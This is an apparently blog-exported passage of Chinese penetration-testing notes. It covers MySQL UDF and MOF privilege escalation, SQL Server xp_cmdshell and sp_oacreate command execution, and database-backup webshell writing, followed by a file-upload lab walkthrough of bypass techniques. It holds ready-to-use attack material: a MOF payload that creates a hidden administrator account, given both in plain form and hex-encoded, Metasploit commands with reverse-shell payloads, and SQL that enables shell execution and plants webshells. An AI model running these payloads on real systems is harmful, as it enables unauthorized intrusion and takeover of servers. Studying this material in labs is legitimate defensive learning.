<p>主要步骤就是获取数据库权限—–&gt;判断mysql版本 大于5.1还需要创建pliugin文件夹（失败了）—–&gt;然后就可以写入自定义函数—–&gt;之后就可以用自定义函数执行系统命令了</p>
<p>这个自定义函数主要工作原理就是调用udf.dll里面的指令执行的，udf.dll里面包含了一些执行系统命令的一些函数</p>
<p>这个sys_eval相当于一个壳用这个来调用udf.dll执行里面的系统指令</p>
<h4 id="MSF进行数据库提权"><a href="#MSF进行数据库提权" class="headerlink" title="MSF进行数据库提权"></a>MSF进行数据库提权</h4><p>一样的，数据库root用户一般不开启外联，所以需要执行命令开启外联</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all on *.* to root@&#x27;%&#x27; identified by &#x27;root&#x27; with grant option;</span><br></pre></td></tr></table></figure></div>

<p>然后利用MSF中的exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload模块进行UDF提权</p>
<p>主要利用的步骤</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/mysql/mysql_udf_payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set 账号 密码</span><br><span class="line">set rhost 对方IP</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p>主要就是MSF的UDF模块会向目录里面导入一个.dll文件，会自动插入mysql库的func里面，如果mysql版本大于5.1就得手动创建一个&#x2F;lib&#x2F;plugin文件夹</p>
<p>其他的步骤都和上面手动利用一样了，就不多赘述</p>
<h4 id="MySQL启动项提权"><a href="#MySQL启动项提权" class="headerlink" title="MySQL启动项提权"></a>MySQL启动项提权</h4><p>启动项提权主要也是利用MSF中的攻击模块进行的，这个也需要开启外联权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line">set rhosts 对方IP地址</span><br><span class="line">set username 账号</span><br><span class="line">set password 密码</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p>然后只需要等待数据库服务器重启就可以连接上了</p>
<p>主要原理就是在目标服务的启动项里写入RoNuO.exe执行文件，当服务重启时，这个文件也会被调用启动，然后就可以反弹shell至攻击机了</p>
<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p>MOF是Windows系统的一个文件，位于c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof，中文名叫做托管对象格式，作用就是每五秒就会去监控进程的创建和死亡</p>
<p>mof提权原理主要就是我们拿到了数据库的root权限之后就可以上传我们自己的mof文件，且root权限可以执行我们上传的mof，一定时间后mof就会被执行，其中有一段是vbs脚本，里面大多数是利用cmd添加管理员的命令</p>
<p>其实MOF提权并不局限于mysql数据库，这里，mysql数据库只是一个让我们向mof目录写入mof文件的一个桥梁，其他的可以达到同样目的的也可以造成mof提权</p>
<h4 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h4><p>前提已经拿到网站的shell，发现数据库</p>
<p>首先我们需要利用webshell工具把test.mof文件上传到www文件夹下</p>
<p>代码如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>还是得查看secure_file_priv的参数，看看mysql是否被允许导出文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure></div>

<p>是空就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418141726103.png"
                      alt="image-20230418141726103"
                ></p>
<p>接下来我们需要将在www文件夹下的test.mof文件导出至 C:\WINDOWS\system32\wbem\mof 下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;E:/phpstudy/phpstudy_pro/WWW/test.mof&#x27;) into dumpfile &#x27;C:/WINDOWS/system32/wbem/mof/test.mof&#x27;</span><br></pre></td></tr></table></figure></div>

<p>接下来只需要等待一段时间他就会自动执行了</p>
<p>一般来说mof文件夹中有bad和good文件夹，成功执行的会被放入good文件夹中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418142239889.png"
                      alt="image-20230418142239889"
                ></p>
<p>查询<code>net user</code>就知道它添加了一个管理员账户hacker了，提权成功</p>
<h4 id="简单方法"><a href="#简单方法" class="headerlink" title="简单方法"></a>简单方法</h4><p>直接利用sql语句将恶意代码写入到mof目录下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile &quot;C:/windows/system32/wbem/mof/test2.mof&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>之所以十六进制编码传输是为了数据不丢失</p>
<h4 id="MSF自带模块提权"><a href="#MSF自带模块提权" class="headerlink" title="MSF自带模块提权"></a>MSF自带模块提权</h4><p>MSF中具有mof的提权模块</p>
<p>我们要先上传test.mof文件</p>
<p>然后设置一系列参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"> </span><br><span class="line"># 设置payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"> </span><br><span class="line"># 设置目标 MySQL 的基础信息</span><br><span class="line">set rhosts 对方IP</span><br><span class="line">set username 账号</span><br><span class="line">set password 密码</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p>然后就行了</p>
<h4 id="收尾工作"><a href="#收尾工作" class="headerlink" title="收尾工作"></a>收尾工作</h4><p>由于mof文件会隔一段时间一直被调用，所以必须及时清除这个文件</p>
<p>但是想要清除这个文件必须要暂时关闭winmgmt服务再删除mof文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 停止 winmgmt 服务</span><br><span class="line">net stop winmgmt</span><br><span class="line"> </span><br><span class="line"># 删除 Repository 文件夹</span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"> </span><br><span class="line"># 手动删除 mof 文件</span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"> </span><br><span class="line"># 删除创建的用户</span><br><span class="line">net user hacker /delete</span><br><span class="line"> </span><br><span class="line"># 重新启动服务</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure></div>

<p>然后mof提权的全部内容就这样结束了</p>
<h2 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL Server提权"></a>SQL Server提权</h2><p>SQL Server提权主要依赖于自带的存储过程，要求SQL Server 权限—-&gt;系统权限</p>
<p>而存储过程就是一个可编程的函数，他在数据库中创建并且保存，是存储在服务器中的一组预编译过的T-SQL语句，我们可以将存储过程认为是函数调用过程，可以使用execute命令执行存储过程</p>
<p>这个它主要分为系统存储过程，扩展存储过程，用户系定义的存储过程</p>
<p>存储过程主要存储在master数据库中，以sp_为前缀，在任何数据库中都可以调用</p>
<p>扩展存储过程中主要是对动态链接库的（dll）函数调用，主要用于客户端于服务器端  或者和护短之间进行通信，以xp_为前缀</p>
<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>要执行系统命令，首先需要获取sqlserver数据库权限（sa），然后借助自带的存储过程进行提权，就可以实现SQL Server权限—–&gt;系统权限</p>
<h4 id="xp-cmdshell利用过程"><a href="#xp-cmdshell利用过程" class="headerlink" title="xp_cmdshell利用过程"></a>xp_cmdshell利用过程</h4><p>xp_cmdshell是一个扩展存储过程</p>
<p>可以让系统管理员具有操作cmd的权限，并且以文本方式返回输出</p>
<p>xp_cmdshell在SQLserver2000中默认开启，可以直接执行系统命令</p>
<p>2005本身及之后的版本默认禁止，所以想要使用，就需要拥有SA账号相应权限，使用sp_configure将其开启。</p>
<p>所以我们要先判断是否是sa权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>返回1就是</p>
<p>还要判断xp_cmdshell是否存在，1就是存在，0就是不存在</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) FROM master..sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27; </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161347953.png"
                      alt="image-20230418161347953"
                ></p>
<p>如果是0的话，可以执行下列命令开启</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE</span><br></pre></td></tr></table></figure></div>

<p>不开启的话执行命令会报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161455586.png"
                      alt="image-20230418161455586"
                ></p>
<p>要关闭的话</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;exec sp_configure &#x27;xp_cmdshell&#x27;,0;RECONFIGURE;</span><br></pre></td></tr></table></figure></div>



<p>如果被删除可以通过xplog70.dll来恢复</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure></div>



<p>但是…如果xplog70.dll也被删除了的也可以恢复</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;;</span><br></pre></td></tr></table></figure></div>



<p>一切都配置好之后就可以通过xp_cmdshell来执行系统命令了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;whoami&#x27;;</span><br><span class="line">或者</span><br><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161326688.png"
                      alt="image-20230418161326688"
                ></p>
<h4 id="sp-oacreate实现提权操作"><a href="#sp-oacreate实现提权操作" class="headerlink" title="sp_oacreate实现提权操作"></a>sp_oacreate实现提权操作</h4><p>当xp_cmdhsell被删除的时候，可以借助SQL Server中的COM 逐渐sp_oacreate来执行系统命令</p>
<p>原理是SQL Server提供和了一些函数访问OLE对象，sp_oacreate和sp_oamethod这两个可以调用OLE控件，间接来获取shell</p>
<h6 id="啥是OLE？"><a href="#啥是OLE？" class="headerlink" title="啥是OLE？"></a>啥是OLE？</h6><p>OLE是一种面向对象的技术，是一个API接口，里面包含了可以重复使用的软件组件(COM)</p>
<p>要判断是否可以使用sp_oacreate执行系统命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163725677.png"
                      alt="image-20230418163725677"
                ></p>
<p>如果报错的话，没事，还可以使用以下命令打开</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163825197.png"
                      alt="image-20230418163825197"
                ></p>
<p>然后就可以执行命令了，但是它没有回显，所以得用txt文件的形式导出</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\test.txt&#x27; </span><br></pre></td></tr></table></figure></div>

<p>执行whoami得出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418164047098.png"
                      alt="image-20230418164047098"
                ></p>
<p>也可以使用这个来添加新用户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user hack Password@ /add</span><br></pre></td></tr></table></figure></div>



<h4 id="使用CLR执行系统命令"><a href="#使用CLR执行系统命令" class="headerlink" title="使用CLR执行系统命令"></a>使用CLR执行系统命令</h4><p>SQL Server2005开始，就集成了用于Microsoft Windows 的 .NET Framework的公共语言运行时的（CLR）组件</p>
<p>这个意味着可以使用 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数</p>
<p>具体不太清楚，先空着吧</p>
<h4 id="数据库差异备份写webshell"><a href="#数据库差异备份写webshell" class="headerlink" title="数据库差异备份写webshell"></a>数据库差异备份写webshell</h4><p>差异备份数据库得到webshell，在SQL Server里面dbo和sa都有备份数据库的权限</p>
<p>我们可以吧数据库备份成asp文件，这样我们就可以通过mssqlserver的备份数据库生成一个网页小马</p>
<h6 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h6><p>具有db_owner权限</p>
<p>知道web绝对路径</p>
<h6 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一步</span><br><span class="line">create DATABASE Testdb;</span><br><span class="line">第二步</span><br><span class="line">backup database Testdb to disk = &#x27;c:\test2.bak&#x27;;</span><br><span class="line">use Testdb;</span><br><span class="line">create table [dbo].[Testdb] ([cmd] [image]);</span><br><span class="line">insert into Testdb(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);</span><br><span class="line"></span><br><span class="line">3c3f70687020706870696e666f28293b3f3e为16进制的&lt;?php phpinfo();?&gt;，实际情况下可以改成一句话木马</span><br><span class="line"></span><br><span class="line">backup database Testdb to disk=&#x27;C:\\phpinfo.php&#x27; WITH DIFFERENTIAL,FORMAT;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165759713.png"
                      alt="image-20230418165759713"
                ></p>
<p>生成两个文件，其中phpinfo.php就是webshell换成一句话木马就具有攻击性了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165827318.png"
                      alt="image-20230418165827318"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165918697.png"
                      alt="image-20230418165918697"
                ></p>
<h4 id="日志差异备份写webshell"><a href="#日志差异备份写webshell" class="headerlink" title="日志差异备份写webshell"></a>日志差异备份写webshell</h4><p>这个的主要原理也是利用备份写入一句话木马</p>
<h6 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h6><p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式</p>
<h6 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h6><p>备份的文件大小比较小</p>
<h6 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database Testdb      --新建数据库Testdb</span><br><span class="line"></span><br><span class="line">alter database Testdb set RECOVERY FULL;   --修改数据库恢复模式为 完整模式</span><br><span class="line"></span><br><span class="line">create table cmd (a image);        --创建一张表cmd，只有一个列 a，类型为image</span><br><span class="line"></span><br><span class="line">backup log Testdb to disk= &#x27;C:\\1.php&#x27; with init;   --备份表到指定路径</span><br><span class="line"></span><br><span class="line">insert into cmd (a) values(0x3c3f706870706870696e666f28293b3f3e);  --插入一句话到cmd表里</span><br><span class="line"></span><br><span class="line">backup log Testdb to disk=&#x27;C:\\phpinfo.php&#x27;;   --把操作日志备份到指定文件</span><br></pre></td></tr></table></figure></div>

<p>执行完后</p>
<p>一样的，就可以生成两个文件</p>
<p>其中phpinfo.php就是webshell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418170435006.png"
                      alt="image-20230418170435006"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>文件上传绕过之靶场实战</title>
    <url>/2023/05/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%B9%8B%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h2 id="文件上传返回代码："><a href="#文件上传返回代码：" class="headerlink" title="文件上传返回代码："></a>文件上传返回代码：</h2><p>0：没有发生错误，文件上传成功</p>
<p>1：上传的文件超过了php.ini中upload_max_filesize选项限制的值</p>
<p>2：上传的文件超过了HTML表单中MAX_FILE_SIZE选项指定的值</p>
<p>3：文件只有部分被上传</p>
<p>4：没有文件被上传</p>
<h2 id="文件上传靶场绕过"><a href="#文件上传靶场绕过" class="headerlink" title="文件上传靶场绕过"></a>文件上传靶场绕过</h2><h4 id="js前端绕过方法：第一关"><a href="#js前端绕过方法：第一关" class="headerlink" title="js前端绕过方法：第一关"></a>js前端绕过方法：第一关</h4><ol>
<li><p>可以在网页源代码中将js验证代码删除绕过onsubmit&#x3D;”return checkFile()”</p>
</li>
<li><p>通过brupsuit抓包：先将要上传的php文件后缀改为允许上传的格式，然后上传通过抓包，将数据包中的文件格式改回.php发送，就绕过了前端检测</p>
</li>
</ol>
<h4 id="Content-type检测上传绕过：第二关"><a href="#Content-type检测上传绕过：第二关" class="headerlink" title="Content_type检测上传绕过：第二关"></a>Content_type检测上传绕过：第二关</h4><ol>
<li>上传php文件，通过抓包将content_type类型改为image&#x2F;jpeg，放包即可</li>
</ol>
<h4 id="黑名单上传绕过：第三关"><a href="#黑名单上传绕过：第三关" class="headerlink" title="黑名单上传绕过：第三关"></a>黑名单上传绕过：第三关</h4><p>有些文件上传会过滤掉一些文件格式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps1.jpg"
                      alt="img"
                > </p>
<ol>
<li><p>asa </p>
</li>
<li><p>Cer</p>
</li>
<li><p>ashx代替aspx 4. </p>
</li>
<li><p>Phtml</p>
</li>
<li><p>Cdx</p>
</li>
<li><p>php3</p>
</li>
</ol>
<p>只要换个后缀名即可，当然需要一个一个试直到上传成功</p>
<h4 id="htaccess绕过：第四关"><a href="#htaccess绕过：第四关" class="headerlink" title="htaccess绕过：第四关"></a>htaccess绕过：第四关</h4><p>.htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p>
<p>因为黑名单过滤了大多数的可执行文件，但是如果可以上传.htaccess文件后缀，则这个文件可以改变你的文件后缀名，在htaccess文件里面写入sethandler application&#x2F;x-httpd-php就可以将文件重写为php文件</p>
<h4 id="大小写绕过：第五关"><a href="#大小写绕过：第五关" class="headerlink" title="大小写绕过：第五关"></a>大小写绕过：第五关</h4><p>上传模块没有对上传文件的后缀名的大小写进行过滤，可以改后缀名的大小写</p>
<p>pHp  PHP  PhP  PHp等等</p>
<h4 id="空格绕过：第六关"><a href="#空格绕过：第六关" class="headerlink" title="空格绕过：第六关"></a>空格绕过：第六关</h4><p>上传模块没有过滤空格，在文件的后缀里加一个空格即可绕过，不行的话可以通过brupsuite抓包然后在那里面更改，之后重新发送即可获得上传地址。</p>
<h4 id="利用Windows系统特征绕过：第七关"><a href="#利用Windows系统特征绕过：第七关" class="headerlink" title="利用Windows系统特征绕过：第七关"></a>利用Windows系统特征绕过：第七关</h4><p>由于系统特性，shell.php与shell.php.在Windows系统中是一样的存在，所以可以利用这一特性绕过。</p>
<h4 id="NTFS交换数据流-DATA绕过：第八关"><a href="#NTFS交换数据流-DATA绕过：第八关" class="headerlink" title="NTFS交换数据流::$DATA绕过：第八关"></a>NTFS交换数据流::$DATA绕过：第八关</h4><p>如果系统后缀没有对::$DATA进行过滤，我们就可以利用这一特性进行绕过上传，有些没有对后缀的前后字符置空，所以就可以绕过</p>
<p>通过brupsuit抓包然后对其数据包中的文件名如shell.php改为shell.php::$DATA进行上传，即可成功</p>
<h4 id="利用windows环境的叠加特征进行绕过：第九关"><a href="#利用windows环境的叠加特征进行绕过：第九关" class="headerlink" title="利用windows环境的叠加特征进行绕过：第九关"></a>利用windows环境的叠加特征进行绕过：第九关</h4><p>利用windows的叠加属性：</p>
<p>双引号 ” 等于  点号 .</p>
<p>大于号 &gt;  等于  问号 ?</p>
<p>小于号 &lt;  等于  星号 *</p>
<p>通过抓包上传shell.php:.jpg文件会被识别为shell.php的空文件,紧接着就可以再次提交吧shell.php改为shell.&gt;&gt;&gt;就会自动匹配写入代码</p>
<h4 id="文件双写绕过：第十关"><a href="#文件双写绕过：第十关" class="headerlink" title="文件双写绕过：第十关"></a>文件双写绕过：第十关</h4><p>有些会把如shell.php的后缀置为空成shell. 但是我们可以通过双写进行绕过</p>
<p>抓包&#x2F;直接改文件名为shell.pphphp即可，它会将识别到的第一个php进行过滤剩下的就只有shell.php即可绕过</p>
<h4 id="接下来采用的是白名单过滤，我们可以上传一个符合的文件，然后抓包对其url中添加一个如shell-php-00文件进行截断，提交即可"><a href="#接下来采用的是白名单过滤，我们可以上传一个符合的文件，然后抓包对其url中添加一个如shell-php-00文件进行截断，提交即可" class="headerlink" title="****接下来采用的是白名单过滤，我们可以上传一个符合的文件，然后抓包对其url中添加一个如shell.php%00文件进行截断，提交即可"></a>****接下来采用的是白名单过滤，我们可以上传一个符合的文件，然后抓包对其url中添加一个如shell.php%00文件进行截断，提交即可</h4><p>必须在gpc关闭的情况下使用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps2.jpg"
                      alt="img"
                > </p>
<h4 id="目录可控绕过（post）：第十二关"><a href="#目录可控绕过（post）：第十二关" class="headerlink" title="目录可控绕过（post）：第十二关"></a>目录可控绕过（post）：第十二关</h4><p>上面是利用get形式进行提交，而使用post方式提交的必须对%00进行解码</p>
<p>必须在gpc关闭的情况下使用</p>
<p>解码步骤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps3.jpg"
                      alt="img"
                > </p>
<h4 id="文件头检测绕过：第十三关"><a href="#文件头检测绕过：第十三关" class="headerlink" title="文件头检测绕过：第十三关"></a>文件头检测绕过：第十三关</h4><p>有些文件上传会检查头文件，不同的文件，头文件也是不尽相同。常见的文件上传图片头检测，检车图片是两个字节长度，如果不是图片格式，会禁止上传。</p>
<p>常见的文件头：</p>
<p>JPEG（jpg）文件头  FFD8FF</p>
<p>PNG（png）文件头  89504E47</p>
<p>GIF（gif）文件头   47494638</p>
<p>TIFF（tif）文件头   49492A00</p>
<p>Windows Bitmap（bmp）文件头  424D</p>
<p>getReailFileType就是检测 jpg png gif的文件头的代码</p>
<ol>
<li><p>可以通过抓包上传shell.php然后在其代码中加个GIF89a即可</p>
</li>
<li><p>制作图片马，使用copy 1.gif&#x2F;b+hhh.php shell.php  意思是将1.gif的文件内容和hhh.php的内容写入shell.php中，然后将shell.php改为shell.jpg上传即可</p>
</li>
</ol>
<h4 id="图片检测函数绕过：第十四关"><a href="#图片检测函数绕过：第十四关" class="headerlink" title="图片检测函数绕过：第十四关"></a>图片检测函数绕过：第十四关</h4><p>getimagesize是检测图片的大小等信息</p>
<p>同样使用图片马即可绕过：</p>
<p>制作图片马，使用copy 1.gif&#x2F;b+hhh.php shell.php  意思是将1.gif的文件内容和hhh.php的内容写入shell.php中，然后将shell.php改为shell.gif上传即可</p>
<h4 id="图片二次渲染绕过：第十六关"><a href="#图片二次渲染绕过：第十六关" class="headerlink" title="图片二次渲染绕过：第十六关"></a>图片二次渲染绕过：第十六关</h4><p>有些图片需要二次渲染，如压缩图片达到网站要求大小等，所以我们上传的图片马可能其中的代码会被清除，导致绕过失败</p>
<p>最好用gif文件这样二次渲染前后相同点较多，可以将原gif文件上传得到渲染过后的文件，然后利用工具对比两份文件相同内容的地方，然后在对其不变的地方进行php代码的写入</p>
<h4 id="文件名可控绕过：第十九关"><a href="#文件名可控绕过：第十九关" class="headerlink" title="文件名可控绕过：第十九关"></a>文件名可控绕过：第十九关</h4><p>1.上传hhh.php文件然后抓包将其保存的文件名改为hhh.php%00.jpg （注意：%00需要编码）即可（有版本限制php版本必须小于5.3.4，且gpc必须关闭，应用场景较小）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps4.jpg"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
